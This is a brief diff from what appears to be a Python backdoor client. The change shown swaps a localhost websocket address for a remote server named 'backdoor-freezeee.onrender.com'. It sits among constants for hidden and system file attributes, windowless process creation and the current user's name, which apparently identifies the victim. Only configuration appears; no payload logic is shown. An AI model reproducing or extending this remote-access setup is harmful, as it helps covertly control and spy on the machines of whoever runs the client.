@@ -11,8 +11,7 @@ FILE_ATTRIBUTE_HIDDEN = 0x2
 FILE_ATTRIBUTE_SYSTEM = 0x4
 
 CREATE_NO_WINDOW = 0x08000000
-SERVER_PORT = 8602
-SERVER_URL = f"ws://localhost:{SERVER_PORT}"
+SERVER_URL = "wss://backdoor-freezeee.onrender.com"
 CLIENT_NAME = getpass.getuser()
 FILE_ATTRIBUTE_NORMAL = 0x80
 
